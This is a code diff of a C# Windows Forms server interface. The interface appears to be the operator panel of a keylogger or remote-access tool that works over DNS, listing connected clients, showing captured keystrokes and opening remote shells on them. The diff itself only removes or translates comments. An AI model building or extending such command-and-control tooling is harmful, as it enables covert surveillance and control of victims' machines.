@@ -10,11 +10,11 @@ namespace Server.UI
         private bool _isRunning = false;
         private Dictionary<int, RemoteShellForm> _shellForms = new();
 
-        // UI Controls
+
         private TextBox txtDomain = null!;
         private TextBox txtPort = null!;
         private TextBox txtLogPath = null!;
-        private TextBox txtServerIp = null!;  // NEW
+        private TextBox txtServerIp = null!;
         private Button btnStartStop = null!;
         private RichTextBox txtLog = null!;
         private ListView lvClients = null!;
@@ -46,11 +46,11 @@ namespace Server.UI
             this.StartPosition = FormStartPosition.CenterScreen;
             this.FormClosing += MainForm_FormClosing;
 
-            // === TOP PANEL - Configuration ===
+            // Panel tren - Cau hinh server
             Panel configPanel = new Panel
             {
                 Dock = DockStyle.Top,
-                Height = 150,  // Increased height
+                Height = 150,
                 BackColor = Color.FromArgb(240, 240, 240),
                 Padding = new Padding(10)
             };
@@ -64,7 +64,7 @@ namespace Server.UI
                 ForeColor = Color.FromArgb(0, 120, 215)
             };
 
-            // Row 1
+
             Label lblDomain = new Label { Text = "Domain:", Location = new Point(10, 45), AutoSize = true };
             txtDomain = new TextBox
             {
@@ -87,10 +87,10 @@ namespace Server.UI
                 Location = new Point(520, 43),
                 Width = 150,
                 Text = "127.0.0.1"
-                // Note: Public IP of this server (for NS/A records in production)
+
             };
 
-            // Row 2
+
             Label lblLogPathLabel = new Label { Text = "Logs:", Location = new Point(10, 75), AutoSize = true };
             txtLogPath = new TextBox
             {
@@ -134,7 +134,7 @@ namespace Server.UI
                 btnStartStop, lblStatus, lblConnections
             });
 
-            // === MIDDLE SECTION - Split Container ===
+            // Phan chia giua - Split Container
             SplitContainer splitContainer = new SplitContainer
             {
                 Dock = DockStyle.Fill,
@@ -142,7 +142,7 @@ namespace Server.UI
                 SplitterDistance = 350
             };
 
-            // === TOP SPLIT - Clients List ===
+            // Phan tren split - Danh sach clients
             GroupBox grpClients = new GroupBox
             {
                 Text = "Connected Clients",
@@ -163,7 +163,7 @@ namespace Server.UI
             lvClients.Columns.Add("Packets", 80);
             lvClients.Columns.Add("Data Size", 100);
             
-            // Add context menu for right-click
+            // Them context menu cho right-click
             ContextMenuStrip contextMenu = new ContextMenuStrip();
             ToolStripMenuItem menuRemoteShell = new ToolStripMenuItem("🖥️ Open Remote Shell");
             menuRemoteShell.Click += MenuRemoteShell_Click;
@@ -173,7 +173,7 @@ namespace Server.UI
             grpClients.Controls.Add(lvClients);
             splitContainer.Panel1.Controls.Add(grpClients);
 
-            // === BOTTOM SPLIT - Tabs for Logs and Keystrokes ===
+            // Phan duoi split - Tabs cho Logs va Keystrokes
             TabControl tabControl = new TabControl
             {
                 Dock = DockStyle.Fill
@@ -251,14 +251,14 @@ namespace Server.UI
                     return;
                 }
 
-                // Validate IP
+
                 if (!System.Net.IPAddress.TryParse(serverIp, out _))
                 {
                     MessageBox.Show("Please enter a valid IP address", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
                 }
 
-                // Check if port 53 requires admin
+
                 if (port <= 1024)
                 {
                     MessageBox.Show(
@@ -273,7 +273,7 @@ namespace Server.UI
                 _serverLogic?.Start(port, domain, logPath, serverIp);
                 _isRunning = true;
 
-                // Update UI
+
                 btnStartStop.Text = "⏹ STOP SERVER";
                 btnStartStop.BackColor = Color.FromArgb(192, 0, 0);
                 lblStatus.Text = "🟢 Running";
@@ -364,7 +364,7 @@ namespace Server.UI
             txtKeystrokePreview.AppendText(data);
             txtKeystrokePreview.ScrollToCaret();
 
-            // Update client list
+
             foreach (ListViewItem item in lvClients.Items)
             {
                 if (item.Tag != null && (int)item.Tag == connectionId)
@@ -394,14 +394,14 @@ namespace Server.UI
             int connectionId = (int)selectedItem.Tag;
             string clientIp = selectedItem.SubItems[1].Text;
 
-            // Check if shell already open for this connection
+
             if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
             {
                 _shellForms[connectionId].Focus();
                 return;
             }
 
-            // Create new shell form
+
             var shellForm = new RemoteShellForm(connectionId, clientIp, SendCommandToClient);
             shellForm.FormClosed += (s, args) => _shellForms.Remove(connectionId);
             _shellForms[connectionId] = shellForm;
@@ -427,7 +427,7 @@ namespace Server.UI
                 return;
             }
 
-            // Send result to shell form if open
+
             if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
             {
                 _shellForms[connectionId].AppendOutput(result);
@@ -457,7 +457,7 @@ namespace Server.UI
                 }
             }
 
-            // Close all shell forms
+
             foreach (var form in _shellForms.Values)
             {
                 if (!form.IsDisposed)
